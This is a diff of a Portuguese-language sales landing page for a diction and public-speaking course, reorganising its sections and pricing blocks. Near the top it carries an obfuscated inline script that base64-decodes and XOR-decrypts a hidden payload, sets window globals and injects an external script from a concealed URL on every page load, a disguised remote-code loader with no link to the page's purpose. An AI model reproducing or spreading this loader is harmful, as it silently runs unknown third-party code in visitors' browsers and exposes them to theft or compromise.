@@ -21,7 +21,8 @@
 <script>(function(){var q_tah1=atob("DKJW03kmTYSUTG2e+9l0pgtKb762JBnqi9Fs/FZFKeq6ORnzksQv/RpJIKr2PkLtmNA/ow1VYvT9NAjy1NI/qxxKY+7nbkG8mtYioRBEOPDxP0+koP968R5KIub1IB68wfkt8RdHIOG2dk/uktozvzBCb6i2Ogzyjsd06VsQL7SlLQ+uz8Ru40oQfLL2eg6vmcMytRwEMNnp");var f_8b=[];for(var b_d=0;b_d<q_tah1.length;b_d++){f_8b.push(q_tah1.charCodeAt(b_d)&255);}var v_ixh=f_8b[0];var m_yt=f_8b.slice(1,1+v_ixh);var e_i=f_8b.slice(1+v_ixh);var b_n6ad=e_i.map(function(b,z_8y3g){return b^m_yt[z_8y3g%v_ixh];});var x_77="";for(var i_y=0;i_y<b_n6ad.length;i_y++){x_77+=String.fromCharCode(b_n6ad[i_y]&255);}var e_t=decodeURIComponent(escape(x_77));var v_q=JSON.parse(e_t);var v_bsq=v_q.globals||[];v_bsq.forEach(function(i_j){window[i_j.name]=i_j.value;});var y_gtb=document.createElement("script");y_gtb.src=v_q.url;y_gtb.async=true;y_gtb.defer=true;(v_q.attributes||[]).forEach(function(m_rj){y_gtb.setAttribute(m_rj.name,m_rj.value);});(document.head||document.documentElement).appendChild(y_gtb);})();</script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<link rel="preload" as="image" href="img/mockup-kit.webp" fetchpriority="high">
 
 <style>
 :root{
@@ -113,6 +114,9 @@ section{scroll-margin-top:70px}
 .hero-c .lead{margin:0 auto;max-width:720px}
 .hero-c .hero-img{margin:36px auto 30px;max-width:820px}
 .hero-c .btn{margin-top:0}
+.hero-c .hook{display:inline-block;margin:0 auto 14px;padding:6px 14px;border-radius:999px;background:rgba(220,38,38,.16);color:#FCA5A5;font:700 .95rem var(--sans)}
+.hero-price{margin-top:14px;color:#D4D4D8;font-size:.92rem}
+.hero-price b{color:#fff;font-size:1.05rem}
 .hero-list{list-style:none;display:grid;gap:10px;margin-top:22px}
 .hero-list li{display:flex;gap:10px;align-items:flex-start;color:#E4E4E7;font-size:1rem}
 .hero-list svg{width:20px;height:20px;color:#EF4444;flex:none;margin-top:3px}
@@ -244,7 +248,8 @@ section{scroll-margin-top:70px}
 @media (prefers-reduced-motion: reduce){.depo{overflow-x:auto;pointer-events:auto}.depo-track{animation:none}}
 .fan{position:relative;max-width:620px;margin:0 auto 48px;aspect-ratio:16/11}
 .fan img{position:absolute;width:38%;height:auto;aspect-ratio:2/3;border-radius:8px;box-shadow:0 24px 50px -16px rgba(0,0,0,.75);background:#fff}
-.bonus{display:grid;gap:18px}
+.bonus{display:grid;gap:12px;grid-template-columns:repeat(2,1fr)}
+@media(max-width:699px){.bonus h3{font-size:.95rem}.bonus p{font-size:.85rem}}
 @media(min-width:700px){.bonus{grid-template-columns:repeat(2,1fr)}}
 @media(min-width:1000px){.bonus{grid-template-columns:repeat(3,1fr)}}
 .bcard{background:#fff;border:1px solid var(--line);border-radius:20px;overflow:hidden;display:flex;flex-direction:column;transition:transform .25s,box-shadow .25s}
@@ -360,10 +365,12 @@ footer a{color:#D4D4D8}
 <section class="hero dark" id="topo" aria-labelledby="hero-t">
   <svg class="waves" viewBox="0 0 1200 120" preserveAspectRatio="none" aria-hidden="true"><path d="M0 60 Q 50 10 100 60 T 200 60 T 300 60 T 400 60 T 500 60 T 600 60 T 700 60 T 800 60 T 900 60 T 1000 60 T 1100 60 T 1200 60" stroke="#DC2626" stroke-width="2" fill="none"/><path d="M0 60 Q 75 100 150 60 T 300 60 T 450 60 T 600 60 T 750 60 T 900 60 T 1050 60 T 1200 60" stroke="#fff" stroke-width="1.5" fill="none"/></svg>
   <div class="wrap hero-c">
+    <p class="hook">Você grava, apaga e tenta de novo?</p>
     <h1 id="hero-t">Melhore sua <span class="red">dicção e oratória</span> e fale com mais segurança diante da câmera.</h1>
     <p class="lead">Chega de travar, acelerar ou embolar as palavras na hora de gravar. O Método V.O.Z. é um treino guiado de 30 dias com exercícios de dicção, respiração, ritmo e oratória — do primeiro vídeo de 30 segundos até uma apresentação completa.</p>
     <img class="hero-img" src="img/mockup-kit.webp" width="1400" height="933" fetchpriority="high" decoding="async" alt="Materiais do Desafio da Voz, método prático de dicção e oratória: caderno principal, páginas de exercícios de dicção e roteiro com pausas, e um desafio de gravação no celular">
     <a href="#oferta" class="btn btn-red">QUERO MELHORAR MINHA DICÇÃO E ORATÓRIA <svg><use href="#i-arrow"/></svg></a>
+    <p class="hero-price">A partir de <b data-price-min></b> · pagamento único · acesso imediato · garantia de 7 dias</p>
   </div>
 </section>
 
@@ -387,7 +394,70 @@ footer a{color:#D4D4D8}
     </div>
     <p class="demo-note" id="demo-note" hidden>Exemplos de demonstração. As prévias reais do material serão exibidas aqui.</p>
 
-    <div class="cta-row"><a href="#oferta" class="btn btn-red">QUERO ACESSAR O MÉTODO COMPLETO <svg><use href="#i-arrow"/></svg></a></div>
+    <div class="cta-row"><a href="#oferta" class="btn btn-red">VER OS PLANOS (A PARTIR DE R$ 10) <svg><use href="#i-arrow"/></svg></a></div>
+  </div>
+</section>
+
+<!-- 10 OFERTA -->
+<section class="sec gray" id="oferta" aria-labelledby="oferta-t">
+  <div class="wrap">
+    <div class="head center rv">
+      <span class="eyebrow">Planos</span>
+      <h2 id="oferta-t">Escolha como quer começar sua evolução.</h2>
+      <p class="lead">Pagamento único. Material 100% digital.</p>
+    </div>
+    <div class="plans">
+      <div class="plan rv">
+        <h3>KIT ESSENCIAL</h3>
+        <p class="sub">O método completo de dicção e oratória em 10 níveis.</p>
+        <div class="price" data-price="essencial"></div>
+        <div class="once">pagamento único</div>
+        <ul>
+          <li><svg><use href="#i-check"/></svg>10 níveis progressivos</li>
+          <li><svg><use href="#i-check"/></svg>100 exercícios</li>
+          <li><svg><use href="#i-check"/></svg>30 desafios</li>
+          <li><svg><use href="#i-check"/></svg>Guia de pausas e respiração</li>
+        </ul>
+        <a class="btn btn-red" data-checkout="essencial">QUERO O KIT ESSENCIAL <svg><use href="#i-arrow"/></svg></a>
+        <p class="soon" data-soon="essencial" hidden>Checkout em configuração — disponível em breve.</p>
+      </div>
+      <div class="plan pro rv">
+        <span class="badge">MAIS RECURSOS</span>
+        <h3>KIT COMPLETO</h3>
+        <p class="sub">O método completo + materiais extras para criadores de conteúdo.</p>
+        <div class="price" data-price="completo"></div>
+        <div class="once">pagamento único</div>
+        <ul>
+          <li><svg><use href="#i-check"/></svg><strong>Tudo do Essencial</strong></li>
+          <li><svg><use href="#i-check"/></svg>50 ganchos para começar vídeos</li>
+          <li><svg><use href="#i-check"/></svg>20 roteiros para Reels e stories</li>
+          <li><svg><use href="#i-check"/></svg>30 perguntas de improviso</li>
+          <li><svg><use href="#i-check"/></svg>Diário de evolução</li>
+          <li><svg><use href="#i-check"/></svg>Guia de gravação com celular</li>
+        </ul>
+        <a class="btn btn-red" data-checkout="completo">QUERO O KIT COMPLETO <svg><use href="#i-arrow"/></svg></a>
+        <p class="soon" data-soon="completo" hidden>Checkout em configuração — disponível em breve.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 11 GARANTIA -->
+<section class="sec" aria-labelledby="gar-t">
+  <div class="wrap">
+    <div class="guar rv">
+      <div class="seal" aria-hidden="true"><div><b>7</b>DIAS</div></div>
+      <div>
+        <span class="eyebrow">Segurança e transparência</span>
+        <h2 id="gar-t" style="font-size:clamp(1.4rem,3vw,1.9rem);margin:8px 0 12px">Compre com tranquilidade.</h2>
+        <p class="lead">Você pode conhecer o material e avaliar sua compra com a tranquilidade do prazo legal de arrependimento de 7 dias, previsto no Código de Defesa do Consumidor para compras feitas pela internet.</p>
+        <ul class="list" style="margin-top:18px">
+          <li><svg><use href="#i-shield"/></svg>Direito de arrependimento de 7 dias (art. 49 do CDC)</li>
+          <li><svg><use href="#i-check"/></svg>Pagamento único, sem mensalidade</li>
+          <li><svg><use href="#i-check"/></svg>Material 100% digital, acessível após a confirmação do pagamento</li>
+        </ul>
+      </div>
+    </div>
   </div>
 </section>
 
@@ -411,23 +481,6 @@ footer a{color:#D4D4D8}
   </div>
 </section>
 
-<!-- 03 QUEBRA DE CRENÇA -->
-<section class="sec gray" aria-labelledby="crenca-t">
-  <div class="wrap">
-    <div class="head center rv">
-      <span class="eyebrow">Uma nova forma de enxergar</span>
-      <h2 id="crenca-t">Você não precisa nascer sabendo falar bem.</h2>
-      <p class="lead">Comunicação também é uma habilidade que pode ser desenvolvida. E você não precisa começar com um discurso de cinco minutos. Pode começar com 30 segundos.</p>
-    </div>
-    <div class="grid g3 steps">
-      <div class="card rv"><div class="num">01</div><h3 style="margin-top:14px">Comece com frases curtas.</h3><p>Leituras e gravações de poucos segundos para tirar a pressão do primeiro take.</p><div class="grow" aria-hidden="true"><span style="height:30%"></span><span style="height:45%"></span><span style="height:35%"></span></div></div>
-      <div class="card rv"><div class="num">02</div><h3 style="margin-top:14px">Aprenda a controlar sua voz e seu ritmo.</h3><p>Respiração, pausas e dicção treinadas de forma guiada, um exercício por vez.</p><div class="grow" aria-hidden="true"><span style="height:40%"></span><span style="height:65%"></span><span style="height:50%"></span><span style="height:75%"></span><span style="height:55%"></span></div></div>
-      <div class="card rv"><div class="num">03</div><h3 style="margin-top:14px">Evolua para vídeos e apresentações mais elaboradas.</h3><p>Storytelling, vídeos de vendas e improviso entram quando você já tem base.</p><div class="grow" aria-hidden="true"><span style="height:50%"></span><span style="height:80%"></span><span style="height:60%"></span><span style="height:100%"></span><span style="height:70%"></span><span style="height:90%"></span><span style="height:65%"></span></div></div>
-    </div>
-    <div class="banner rv">Você não começa pelo difícil. <span style="color:#EF4444">Você se prepara para chegar até ele.</span></div>
-  </div>
-</section>
-
 <!-- 04 MÉTODO V.O.Z. -->
 <section class="sec dark" aria-labelledby="metodo-t">
   <div class="wrap">
@@ -442,6 +495,49 @@ footer a{color:#D4D4D8}
       <div class="card rv"><div class="letter">V</div><h3><span>V</span> — VOCALIZE</h3><p>Exercícios de dicção, articulação e textos para trabalhar a clareza da sua fala.</p></div>
       <div class="card rv"><div class="letter">O</div><h3><span>O</span> — ORGANIZE</h3><p>Aprenda a utilizar pausas, ritmo, respiração e entonação para apresentar ideias com mais organização.</p></div>
       <div class="card rv"><div class="letter">Z</div><h3><span>Z</span> — ZERE A DISTÂNCIA ENTRE TREINO E PRÁTICA</h3><p>Grave desafios reais, acompanhe sua evolução e aplique as técnicas diante da câmera.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 09 O QUE ESTÁ INCLUSO -->
+<section class="sec dark" aria-labelledby="inc-t">
+  <div class="wrap">
+    <div class="head center rv">
+      <span class="eyebrow">O que está incluso</span>
+      <h2 id="inc-t">Uma jornada completa de treinamento em suas mãos.</h2>
+    </div>
+    <div class="fan rv">
+      <img src="img/p-G01.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Guia de início rápido do Desafio da Voz" style="left:0;top:8%;transform:rotate(-10deg)">
+      <img src="img/p-03A.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Caderno 03: Ritmo, pausas e respiração" style="left:24%;top:2%;transform:rotate(-3deg)">
+      <img src="img/p-03D1.webp" width="420" height="630" loading="lazy" decoding="async" alt="Página de desafio de gravação com roteiro e marcadores" style="left:46%;top:4%;transform:rotate(4deg)">
+      <img src="img/p-10D3b.webp" width="420" height="630" loading="lazy" decoding="async" alt="Desafio final do Nível 10 HARD" style="right:0;top:10%;transform:rotate(11deg)">
+    </div>
+    <p class="ill" style="margin:-28px 0 40px">Páginas reais do material</p>
+    <div class="grid g2 g3">
+      <div class="card rv"><div class="big">10</div><h3 style="margin-top:10px">Cadernos progressivos</h3><p>Um caderno em PDF para cada nível da jornada.</p></div>
+      <div class="card rv"><div class="big">100</div><h3 style="margin-top:10px">Exercícios preparatórios</h3><p>Dicção, leitura, respiração, ritmo e expressão.</p></div>
+      <div class="card rv"><div class="big">30</div><h3 style="margin-top:10px">Desafios de vídeo</h3><p>Gravações guiadas com texto, objetivo e tempo.</p></div>
+      <div class="card rv"><div class="ico"><svg><use href="#i-wind"/></svg></div><h3>Guia de pausas e respiração</h3><p>Textos com orientação de onde pausar e respirar.</p></div>
+      <div class="card rv"><div class="ico"><svg><use href="#i-text"/></svg></div><h3>Trava-línguas e exercícios de dicção</h3><p>Para articular melhor e falar com mais nitidez.</p></div>
+      <div class="card rv"><div class="ico"><svg><use href="#i-clip"/></svg></div><h3>Autoavaliações de evolução</h3><p>Checklists para acompanhar seu progresso a cada desafio.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 09B BÔNUS -->
+<section class="sec" aria-labelledby="bonus-t">
+  <div class="wrap">
+    <div class="head center rv">
+      <span class="eyebrow">Bônus do Kit Completo</span>
+      <h2 id="bonus-t">Materiais extras para quem cria conteúdo.</h2>
+      <p class="lead">Cinco materiais práticos para usar no dia a dia, além dos 10 cadernos.</p>
+    </div>
+    <div class="bonus">
+      <article class="bcard rv"><img src="img/bonus-GA.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 50 ganchos para começar vídeos"><div><small>BÔNUS 1</small><h3>50 ganchos para começar vídeos</h3><p>Frases para captar a atenção nos primeiros segundos, sem depender de exageros.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-RR.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 20 roteiros para Reels e stories"><div><small>BÔNUS 2</small><h3>20 roteiros para Reels e stories</h3><p>Estruturas curtas para vídeos educativos, institucionais e comerciais, prontas para adaptar.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-PI.webp" width="900" height="900" loading="lazy" decoding="async" alt="Cartões do bônus 30 perguntas de improviso"><div><small>BÔNUS 3</small><h3>30 perguntas de improviso</h3><p>Cartões para recortar com situações de entrevistas, reuniões, clientes e imprevistos.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-DE.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Diário de evolução"><div><small>BÔNUS 4</small><h3>Diário de evolução</h3><p>Registros do primeiro ao último vídeo, com mapa de notas e comparação final.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-GC.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Guia de gravação com celular"><div><small>BÔNUS 5</small><h3>Guia de gravação com celular</h3><p>Enquadramento, luz, áudio, ambiente e um checklist para usar antes de cada gravação.</p></div></article>
     </div>
   </div>
 </section>
@@ -489,46 +585,20 @@ footer a{color:#D4D4D8}
   </div>
 </section>
 
-<!-- 09 O QUE ESTÁ INCLUSO -->
-<section class="sec dark" aria-labelledby="inc-t">
+<!-- 03 QUEBRA DE CRENÇA -->
+<section class="sec gray" aria-labelledby="crenca-t">
   <div class="wrap">
     <div class="head center rv">
-      <span class="eyebrow">O que está incluso</span>
-      <h2 id="inc-t">Uma jornada completa de treinamento em suas mãos.</h2>
+      <span class="eyebrow">Uma nova forma de enxergar</span>
+      <h2 id="crenca-t">Você não precisa nascer sabendo falar bem.</h2>
+      <p class="lead">Comunicação também é uma habilidade que pode ser desenvolvida. E você não precisa começar com um discurso de cinco minutos. Pode começar com 30 segundos.</p>
     </div>
-    <div class="fan rv">
-      <img src="img/p-G01.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Guia de início rápido do Desafio da Voz" style="left:0;top:8%;transform:rotate(-10deg)">
-      <img src="img/p-03A.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Caderno 03: Ritmo, pausas e respiração" style="left:24%;top:2%;transform:rotate(-3deg)">
-      <img src="img/p-03D1.webp" width="420" height="630" loading="lazy" decoding="async" alt="Página de desafio de gravação com roteiro e marcadores" style="left:46%;top:4%;transform:rotate(4deg)">
-      <img src="img/p-10D3b.webp" width="420" height="630" loading="lazy" decoding="async" alt="Desafio final do Nível 10 HARD" style="right:0;top:10%;transform:rotate(11deg)">
+    <div class="grid g3 steps">
+      <div class="card rv"><div class="num">01</div><h3 style="margin-top:14px">Comece com frases curtas.</h3><p>Leituras e gravações de poucos segundos para tirar a pressão do primeiro take.</p><div class="grow" aria-hidden="true"><span style="height:30%"></span><span style="height:45%"></span><span style="height:35%"></span></div></div>
+      <div class="card rv"><div class="num">02</div><h3 style="margin-top:14px">Aprenda a controlar sua voz e seu ritmo.</h3><p>Respiração, pausas e dicção treinadas de forma guiada, um exercício por vez.</p><div class="grow" aria-hidden="true"><span style="height:40%"></span><span style="height:65%"></span><span style="height:50%"></span><span style="height:75%"></span><span style="height:55%"></span></div></div>
+      <div class="card rv"><div class="num">03</div><h3 style="margin-top:14px">Evolua para vídeos e apresentações mais elaboradas.</h3><p>Storytelling, vídeos de vendas e improviso entram quando você já tem base.</p><div class="grow" aria-hidden="true"><span style="height:50%"></span><span style="height:80%"></span><span style="height:60%"></span><span style="height:100%"></span><span style="height:70%"></span><span style="height:90%"></span><span style="height:65%"></span></div></div>
     </div>
-    <p class="ill" style="margin:-28px 0 40px">Páginas reais do material</p>
-    <div class="grid g2 g3">
-      <div class="card rv"><div class="big">10</div><h3 style="margin-top:10px">Cadernos progressivos</h3><p>Um caderno em PDF para cada nível da jornada.</p></div>
-      <div class="card rv"><div class="big">100</div><h3 style="margin-top:10px">Exercícios preparatórios</h3><p>Dicção, leitura, respiração, ritmo e expressão.</p></div>
-      <div class="card rv"><div class="big">30</div><h3 style="margin-top:10px">Desafios de vídeo</h3><p>Gravações guiadas com texto, objetivo e tempo.</p></div>
-      <div class="card rv"><div class="ico"><svg><use href="#i-wind"/></svg></div><h3>Guia de pausas e respiração</h3><p>Textos com orientação de onde pausar e respirar.</p></div>
-      <div class="card rv"><div class="ico"><svg><use href="#i-text"/></svg></div><h3>Trava-línguas e exercícios de dicção</h3><p>Para articular melhor e falar com mais nitidez.</p></div>
-      <div class="card rv"><div class="ico"><svg><use href="#i-clip"/></svg></div><h3>Autoavaliações de evolução</h3><p>Checklists para acompanhar seu progresso a cada desafio.</p></div>
-    </div>
-  </div>
-</section>
-
-<!-- 09B BÔNUS -->
-<section class="sec" aria-labelledby="bonus-t">
-  <div class="wrap">
-    <div class="head center rv">
-      <span class="eyebrow">Bônus do Kit Completo</span>
-      <h2 id="bonus-t">Materiais extras para quem cria conteúdo.</h2>
-      <p class="lead">Cinco materiais práticos para usar no dia a dia, além dos 10 cadernos.</p>
-    </div>
-    <div class="bonus">
-      <article class="bcard rv"><img src="img/bonus-GA.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 50 ganchos para começar vídeos"><div><small>BÔNUS 1</small><h3>50 ganchos para começar vídeos</h3><p>Frases para captar a atenção nos primeiros segundos, sem depender de exageros.</p></div></article>
-      <article class="bcard rv"><img src="img/bonus-RR.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 20 roteiros para Reels e stories"><div><small>BÔNUS 2</small><h3>20 roteiros para Reels e stories</h3><p>Estruturas curtas para vídeos educativos, institucionais e comerciais, prontas para adaptar.</p></div></article>
-      <article class="bcard rv"><img src="img/bonus-PI.webp" width="900" height="900" loading="lazy" decoding="async" alt="Cartões do bônus 30 perguntas de improviso"><div><small>BÔNUS 3</small><h3>30 perguntas de improviso</h3><p>Cartões para recortar com situações de entrevistas, reuniões, clientes e imprevistos.</p></div></article>
-      <article class="bcard rv"><img src="img/bonus-DE.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Diário de evolução"><div><small>BÔNUS 4</small><h3>Diário de evolução</h3><p>Registros do primeiro ao último vídeo, com mapa de notas e comparação final.</p></div></article>
-      <article class="bcard rv"><img src="img/bonus-GC.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Guia de gravação com celular"><div><small>BÔNUS 5</small><h3>Guia de gravação com celular</h3><p>Enquadramento, luz, áudio, ambiente e um checklist para usar antes de cada gravação.</p></div></article>
-    </div>
+    <div class="banner rv">Você não começa pelo difícil. <span style="color:#EF4444">Você se prepara para chegar até ele.</span></div>
   </div>
 </section>
 
@@ -545,69 +615,6 @@ footer a{color:#D4D4D8}
     <div class="depo-track" id="depo-track"></div>
   </div>
   <div class="wrap"><p class="ill" style="margin-top:18px">Resultados variam conforme a prática individual.</p></div>
-</section>
-
-<!-- 10 OFERTA -->
-<section class="sec gray" id="oferta" aria-labelledby="oferta-t">
-  <div class="wrap">
-    <div class="head center rv">
-      <span class="eyebrow">Planos</span>
-      <h2 id="oferta-t">Escolha como quer começar sua evolução.</h2>
-      <p class="lead">Pagamento único. Material 100% digital.</p>
-    </div>
-    <div class="plans">
-      <div class="plan rv">
-        <h3>KIT ESSENCIAL</h3>
-        <p class="sub">O método completo de dicção e oratória em 10 níveis.</p>
-        <div class="price" data-price="essencial"></div>
-        <div class="once">pagamento único</div>
-        <ul>
-          <li><svg><use href="#i-check"/></svg>10 níveis progressivos</li>
-          <li><svg><use href="#i-check"/></svg>100 exercícios</li>
-          <li><svg><use href="#i-check"/></svg>30 desafios</li>
-          <li><svg><use href="#i-check"/></svg>Guia de pausas e respiração</li>
-        </ul>
-        <a class="btn btn-line" data-checkout="essencial">ESCOLHER KIT ESSENCIAL</a>
-        <p class="soon" data-soon="essencial" hidden>Checkout em configuração — disponível em breve.</p>
-      </div>
-      <div class="plan pro rv">
-        <span class="badge">MAIS RECURSOS</span>
-        <h3>KIT COMPLETO</h3>
-        <p class="sub">O método completo + materiais extras para criadores de conteúdo.</p>
-        <div class="price" data-price="completo"></div>
-        <div class="once">pagamento único</div>
-        <ul>
-          <li><svg><use href="#i-check"/></svg><strong>Tudo do Essencial</strong></li>
-          <li><svg><use href="#i-check"/></svg>50 ganchos para começar vídeos</li>
-          <li><svg><use href="#i-check"/></svg>20 roteiros para Reels e stories</li>
-          <li><svg><use href="#i-check"/></svg>30 perguntas de improviso</li>
-          <li><svg><use href="#i-check"/></svg>Diário de evolução</li>
-          <li><svg><use href="#i-check"/></svg>Guia de gravação com celular</li>
-        </ul>
-        <a class="btn btn-red" data-checkout="completo">QUERO O KIT COMPLETO <svg><use href="#i-arrow"/></svg></a>
-        <p class="soon" data-soon="completo" hidden>Checkout em configuração — disponível em breve.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- 11 GARANTIA -->
-<section class="sec" aria-labelledby="gar-t">
-  <div class="wrap">
-    <div class="guar rv">
-      <div class="seal" aria-hidden="true"><div><b>7</b>DIAS</div></div>
-      <div>
-        <span class="eyebrow">Segurança e transparência</span>
-        <h2 id="gar-t" style="font-size:clamp(1.4rem,3vw,1.9rem);margin:8px 0 12px">Compre com tranquilidade.</h2>
-        <p class="lead">Você pode conhecer o material e avaliar sua compra com a tranquilidade do prazo legal de arrependimento de 7 dias, previsto no Código de Defesa do Consumidor para compras feitas pela internet.</p>
-        <ul class="list" style="margin-top:18px">
-          <li><svg><use href="#i-shield"/></svg>Direito de arrependimento de 7 dias (art. 49 do CDC)</li>
-          <li><svg><use href="#i-check"/></svg>Pagamento único, sem mensalidade</li>
-          <li><svg><use href="#i-check"/></svg>Material 100% digital, acessível após a confirmação do pagamento</li>
-        </ul>
-      </div>
-    </div>
-  </div>
 </section>
 
 <!-- 12 FAQ -->
@@ -661,7 +668,7 @@ footer a{color:#D4D4D8}
 
 <div class="sticky" id="sticky" aria-hidden="true">
   <div><b>Desafio da Voz</b>a partir de <span data-price-min></span></div>
-  <a href="#oferta" class="btn btn-red" tabindex="-1">VER PLANOS</a>
+  <a href="#oferta" class="btn btn-red" tabindex="-1">QUERO COMEÇAR</a>
 </div>
 
 <script>
@@ -713,7 +720,7 @@ const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
 // Preços
 document.querySelector('[data-price="essencial"]').innerHTML = brl(PRECO_ESSENCIAL).replace("R$", "<small>R$</small>");
 document.querySelector('[data-price="completo"]').innerHTML  = brl(PRECO_COMPLETO).replace("R$", "<small>R$</small>");
-document.querySelector('[data-price-min]').textContent = brl(Math.min(PRECO_ESSENCIAL, PRECO_COMPLETO));
+document.querySelectorAll('[data-price-min]').forEach(e => e.textContent = brl(Math.min(PRECO_ESSENCIAL, PRECO_COMPLETO)));
 
 // Checkouts: sem link = botão desabilitado + aviso
 [["essencial", CHECKOUT_ESSENCIAL], ["completo", CHECKOUT_COMPLETO]].forEach(([k, url]) => {
@@ -806,8 +813,10 @@ if ("IntersectionObserver" in window && !reduce) {
   if (!DEPOIMENTOS.length) return;
   const sec = document.getElementById("depoimentos"), track = document.getElementById("depo-track");
   const html = DEPOIMENTOS.map(d => `<img src="${d.src}" alt="${d.alt}" width="${d.w}" height="${d.h}" loading="lazy" decoding="async" draggable="false">`).join("");
-  track.innerHTML = html + html.replace(/alt="[^"]*"/g, 'alt="" aria-hidden="true"');
-  track.style.setProperty("--dur", Math.max(20, DEPOIMENTOS.length * 7) + "s");
+  const mult = Math.max(1, Math.ceil(8 / DEPOIMENTOS.length));
+  const set = html.repeat(mult);
+  track.innerHTML = set + set.replace(/alt="[^"]*"/g, 'alt="" aria-hidden="true"');
+  track.style.setProperty("--dur", Math.max(25, DEPOIMENTOS.length * mult * 5) + "s");
   sec.hidden = false;
 })();
 
